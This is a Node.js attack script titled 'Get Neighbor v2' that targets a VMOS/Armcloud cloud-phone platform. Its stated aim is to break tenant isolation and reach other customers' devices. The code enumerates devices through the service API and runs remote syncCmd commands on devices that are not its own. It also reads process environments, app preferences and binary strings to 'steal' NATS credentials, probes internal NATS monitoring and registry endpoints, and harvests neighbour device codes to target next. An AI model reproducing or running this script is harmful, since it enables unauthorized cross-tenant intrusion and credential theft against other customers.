#!/usr/bin/env node
/**
 * Get Neighbor v2 — Multi-vector approach
 * 
 * Board isolation confirmed: each RK3588 runs 1 container.
 * Neighbors are on different boards behind network firewall.
 * 
 * New vectors:
 *  1. VMOS API device enumeration — list ALL visible devices, try syncCmd on others
 *  2. NATS credential extraction — steal rtcgesture auth, subscribe to all topics
 *  3. Registry image catalog — list all device images, pull neighbor's
 *  4. Armcloud API pad enumeration — try different pad code patterns
 *  5. NATS monitoring endpoint — list all connected clients (= all devices)
 */

const path = require('path');
const http = require('http');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api } = require('../shared/vmos_api');
const PAD = 'ACP250923JS861KJ';
const R = { ts: new Date().toISOString(), vectors: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  GET NEIGHBOR v2 — MULTI-VECTOR APPROACH');
  console.log('═'.repeat(70));

  // ═══════════════════════════════════════════════════════════════
  // VECTOR 1: VMOS API — Enumerate ALL devices visible to our AK/SK
  // ═══════════════════════════════════════════════════════════════
  console.log('\n▶ VECTOR 1: VMOS API DEVICE ENUMERATION');

  // 1a: List all instances (large page size)
  log('1a: List all instances via API (page=1, rows=500)...');
  const allDevices = await vmosPost('/vcpcloud/api/padApi/infos', { page: 1, rows: 500 });
  R.vectors.api_list = { code: allDevices.code, total: allDevices.data?.total };
  const devices = allDevices.data?.pageData || [];
  log(`  API returned: ${devices.length} devices (total: ${allDevices.data?.total || '?'})`);
  
  const otherDevices = devices.filter(d => d.padCode !== PAD && d.padCode !== 'ACP251008GUOEEHB');
  log(`  Our devices: ${devices.filter(d => d.padCode === PAD || d.padCode === 'ACP251008GUOEEHB').length}`);
  log(`  OTHER devices visible: ${otherDevices.length}`);
  
  for (const d of devices) {
    log(`    ${d.padCode} | status=${d.status} | model=${d.model||'?'} | ip=${d.deviceIp||'?'}`);
  }
  R.vectors.all_devices = devices.map(d => ({ padCode: d.padCode, status: d.status, model: d.model, ip: d.deviceIp, cluster: d.clusterCode }));

  // 1b: Try syncCmd on OTHER devices (if any visible)
  if (otherDevices.length > 0) {
    const target = otherDevices[0];
    log(`\n  ★ FOUND OTHER DEVICE: ${target.padCode} — trying syncCmd...`);
    
    const testCmd = await vmosPost('/vcpcloud/api/padApi/syncCmd', {
      padCode: target.padCode,
      scriptContent: 'id; getprop ro.product.model; getprop ro.build.fingerprint; getprop persist.sys.cloud.imeinum'
    }, 20);
    R.vectors.other_device_cmd = testCmd;
    log(`  syncCmd result: code=${testCmd.code} msg=${testCmd.msg}`);
    if (testCmd.code === 200) {
      const it = (Array.isArray(testCmd.data) ? testCmd.data : [testCmd.data])[0] || {};
      log(`  OUTPUT: ${(it.errorMsg || it.taskResult || '').slice(0, 200)}`);
    }
  }

  // 1c: Try API endpoints that might show more devices
  log('\n1c: Probing other API endpoints...');
  const apiPaths = [
    ['/vcpcloud/api/padApi/listPad', { page: 1, rows: 100 }],
    ['/vcpcloud/api/padApi/queryPads', { page: 1, rows: 100 }],
    ['/vcpcloud/api/padApi/listAllPad', {}],
    ['/vcpcloud/api/padApi/listDevice', { page: 1, rows: 100 }],
    ['/vcpcloud/api/padApi/queryInstances', { page: 1, rows: 100 }],
    ['/vcpcloud/api/padApi/allInstances', {}],
    ['/vcpcloud/api/cluster/list', {}],
    ['/vcpcloud/api/cluster/devices', { clusterCode: '002' }],
  ];
  
  for (const [path, body] of apiPaths) {
    try {
      const r = await vmosPost(path, body, 10);
      R.vectors[`api_${path.split('/').pop()}`] = { code: r.code, msg: r.msg, hasData: !!r.data };
      if (r.code === 200 && r.data) {
        log(`  ✓ ${path}: code=${r.code} data=${JSON.stringify(r.data).slice(0, 100)}`);
      } else {
        log(`  ${path}: ${r.code} ${r.msg || ''}`);
      }
    } catch (e) {
      log(`  ${path}: ${e.message}`);
    }
    await sleep(300);
  }

  // ═══════════════════════════════════════════════════════════════
  // VECTOR 2: NATS CREDENTIAL EXTRACTION — steal rtcgesture auth
  // ═══════════════════════════════════════════════════════════════
  console.log('\n▶ VECTOR 2: NATS CREDENTIAL EXTRACTION');

  // 2a: Read rtcgesture process memory for NATS credentials
  log('2a: Extract NATS creds from rtcgesture (PID 997)...');
  const natsCreds = await run([
    'cat /proc/997/environ 2>/dev/null | tr "\\0" "\\n" | grep -iE "(nats|token|auth|user|pass|secret|key|connect)" | head -20',
    'echo "=== CMDLINE ==="',
    'cat /proc/997/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'echo "=== FD LINKS ==="',
    'ls -la /proc/997/fd/ 2>/dev/null | grep -i socket | head -10',
  ].join('\n'), 15);
  R.vectors.nats_creds_env = natsCreds;
  for (const l of natsCreds.split('\n').slice(0, 10)) { if (l.trim()) log(`  ${l}`); }

  // 2b: Strings from rtcgesture binary for embedded NATS config
  log('2b: Search rtcgesture binary/config for NATS auth...');
  const natsConfig = await run([
    'find /data /system -name "*.conf" -o -name "*.cfg" -o -name "*.json" -o -name "*.ini" 2>/dev/null | xargs grep -l "nats\\|4222" 2>/dev/null | head -5',
    'echo "=== APK NATS CONFIG ==="',
    'find /data/data/com.armcloud.rtcgesture -name "*.xml" -o -name "*.json" -o -name "*.conf" 2>/dev/null | head -10',
  ].join('\n'), 20);
  R.vectors.nats_config_files = natsConfig;
  for (const l of natsConfig.split('\n')) { if (l.trim()) log(`  ${l}`); }

  // 2c: Read found config files
  log('2c: Read rtcgesture shared_prefs and config...');
  const rtcPrefs = await run([
    'ls /data/data/com.armcloud.rtcgesture/shared_prefs/ 2>/dev/null',
    'echo "==="',
    'cat /data/data/com.armcloud.rtcgesture/shared_prefs/*.xml 2>/dev/null | head -50',
    'echo "==="',
    'ls /data/data/com.armcloud.rtcgesture/files/ 2>/dev/null',
    'echo "==="',
    'cat /data/data/com.armcloud.rtcgesture/files/*.json 2>/dev/null | head -30',
    'cat /data/data/com.armcloud.rtcgesture/files/*.conf 2>/dev/null | head -20',
  ].join('\n'), 20);
  R.vectors.rtc_config = rtcPrefs;
  for (const l of rtcPrefs.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // 2d: Read armcloud agent config
  log('2d: Armcloud agent binary/config (process "m", PID 413)...');
  const agentConfig = await run([
    'cat /proc/413/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'cat /proc/413/environ 2>/dev/null | tr "\\0" "\\n" | head -20',
    'echo "=== AGENT FILES ==="',
    'find / -name "m" -type f -perm -111 2>/dev/null | head -5',
    'strings /proc/413/exe 2>/dev/null | grep -iE "(nats|token|auth|http|api|config)" | head -20',
  ].join('\n'), 20);
  R.vectors.agent_config = agentConfig;
  for (const l of agentConfig.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // ═══════════════════════════════════════════════════════════════
  // VECTOR 3: NATS MONITORING — List all connected devices
  // ═══════════════════════════════════════════════════════════════
  console.log('\n▶ VECTOR 3: NATS MONITORING — All connected clients');

  log('3a: NATS /connz (connections)...');
  const connz = await run('curl -s -m10 "http://192.168.200.51:8222/connz?limit=20" 2>/dev/null', 15);
  R.vectors.nats_connz = connz;
  // Parse connections
  try {
    const parsed = JSON.parse(connz);
    log(`  Total connections: ${parsed.num_connections}`);
    const conns = parsed.connections || [];
    for (const c of conns.slice(0, 10)) {
      log(`    ${c.ip}:${c.port} | name=${c.name||'?'} | subs=${c.subscriptions_list?.length || c.num_subs || '?'} | in=${c.in_msgs} out=${c.out_msgs}`);
    }
  } catch (e) { log(`  Parse: ${connz.slice(0, 200)}`); }

  log('3b: NATS /subsz (subscriptions)...');
  const subsz = await run('curl -s -m10 "http://192.168.200.51:8222/subsz?subs=1" 2>/dev/null', 15);
  R.vectors.nats_subsz = subsz;
  log(`  ${subsz.slice(0, 200)}`);

  log('3c: NATS /varz (server info)...');
  const varz = await run('curl -s -m10 "http://192.168.200.51:8222/varz" 2>/dev/null | head -40', 15);
  R.vectors.nats_varz = varz;
  // Extract key fields
  try {
    const parsed = JSON.parse(varz);
    log(`  Server: ${parsed.server_name} v${parsed.version}`);
    log(`  Connections: ${parsed.connections} current, ${parsed.total_connections} total`);
    log(`  Messages: in=${parsed.in_msgs} out=${parsed.out_msgs}`);
    log(`  Subscriptions: ${parsed.subscriptions}`);
    log(`  Auth required: ${parsed.auth_required}`);
  } catch (e) { log(`  ${varz.slice(0, 200)}`); }

  log('3d: NATS /routez (cluster routes)...');
  const routez = await run('curl -s -m10 "http://192.168.200.51:8222/routez" 2>/dev/null', 15);
  R.vectors.nats_routez = routez;
  log(`  ${routez.slice(0, 200)}`);

  // ═══════════════════════════════════════════════════════════════
  // VECTOR 4: IMAGE REGISTRY — Full catalog of all device images
  // ═══════════════════════════════════════════════════════════════
  console.log('\n▶ VECTOR 4: IMAGE REGISTRY CATALOG');

  log('4a: Full v2 catalog (all images)...');
  const catalog = await run('curl -s -m15 "http://192.168.50.11/v2/_catalog?n=1000" 2>/dev/null', 20);
  R.vectors.registry_catalog = catalog;
  try {
    const parsed = JSON.parse(catalog);
    const repos = parsed.repositories || [];
    log(`  Total images: ${repos.length}`);
    for (const repo of repos.slice(0, 20)) log(`    ${repo}`);
    if (repos.length > 20) log(`    ... and ${repos.length - 20} more`);
  } catch (e) { log(`  ${catalog.slice(0, 300)}`); }

  log('4b: List tags for each image (first 5)...');
  try {
    const parsed = JSON.parse(catalog);
    const repos = parsed.repositories || [];
    for (const repo of repos.slice(0, 5)) {
      const tags = await run(`curl -s -m10 "http://192.168.50.11/v2/${repo}/tags/list" 2>/dev/null`, 12);
      R.vectors[`registry_tags_${repo.replace(/\//g,'_')}`] = tags;
      log(`    ${repo}: ${tags.slice(0, 100)}`);
      await sleep(200);
    }
  } catch (e) {}

  // ═══════════════════════════════════════════════════════════════
  // VECTOR 5: Try syncCmd on guessed PAD codes from same cluster
  // ═══════════════════════════════════════════════════════════════
  console.log('\n▶ VECTOR 5: PAD CODE BRUTE — Try syncCmd on cluster 002 devices');
  
  // Our pad codes: ACP250923JS861KJ, ACP251008GUOEEHB
  // Pattern: ACP + YYMMDD + random 8 chars
  // Try common dates + random suffixes, or just nearby IPs mapped to pad codes
  
  // Better: get pad codes from NATS connz client names or from registry image names
  log('5a: Extract pad codes from NATS client connections...');
  const connzFull = await run('curl -s -m15 "http://192.168.200.51:8222/connz?limit=50&sort=msgs_to" 2>/dev/null', 20);
  R.vectors.nats_connz_full = connzFull;
  const padCodes = new Set();
  // Parse connection names for pad codes
  try {
    const parsed = JSON.parse(connzFull);
    for (const c of (parsed.connections || [])) {
      const name = c.name || '';
      const subList = JSON.stringify(c.subscriptions_list || []);
      // Look for ACP patterns
      const matches = (name + ' ' + subList + ' ' + JSON.stringify(c)).match(/ACP\w{14,}/g) || [];
      for (const m of matches) {
        if (m !== PAD && m !== 'ACP251008GUOEEHB') padCodes.add(m);
      }
    }
    log(`  Found ${padCodes.size} neighbor PAD codes from NATS`);
    for (const pc of padCodes) log(`    ${pc}`);
  } catch (e) { log(`  Parse failed: ${e.message}`); }

  // 5b: Try syncCmd on discovered pad codes
  if (padCodes.size > 0) {
    const testPad = [...padCodes][0];
    log(`\n  ★ TESTING syncCmd on neighbor: ${testPad}`);
    
    try {
      const testR = await vmosPost('/vcpcloud/api/padApi/syncCmd', {
        padCode: testPad,
        scriptContent: 'id; getprop ro.product.model; getprop ro.build.fingerprint; getprop persist.sys.cloud.imeinum; getprop ro.serialno'
      }, 20);
      R.vectors.neighbor_cmd = { padCode: testPad, result: testR };
      log(`  Result: code=${testR.code} msg=${testR.msg}`);
      if (testR.code === 200) {
        const it = (Array.isArray(testR.data) ? testR.data : [testR.data])[0] || {};
        const out = (it.errorMsg || it.taskResult || '');
        log(`  ✓ OUTPUT:\n${out.slice(0, 500)}`);
      }
    } catch (e) { log(`  Error: ${e.message}`); }
  }

  // ═══════════════════════════════════════════════════════════════
  // SAVE
  // ═══════════════════════════════════════════════════════════════
  const rf = `${path.join(__dirname, '..', 'reports')}/NEIGHBOR_V2_${Date.now()}.json`;
  fs.writeFileSync(rf, JSON.stringify(R, null, 2));

  console.log('\n' + '═'.repeat(70));
  console.log('  RESULTS SUMMARY');
  console.log('═'.repeat(70));
  console.log(`  VMOS API devices visible:    ${devices.length} (other: ${otherDevices.length})`);
  console.log(`  NATS neighbor pad codes:     ${padCodes.size}`);
  console.log(`  Registry images:             ${R.vectors.registry_catalog ? 'found' : 'none'}`);
  console.log(`  Neighbor syncCmd access:     ${R.vectors.neighbor_cmd?.result?.code === 200 ? '✓ SUCCESS' : '⚠ testing'}`);
  console.log(`  Report: ${rf}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
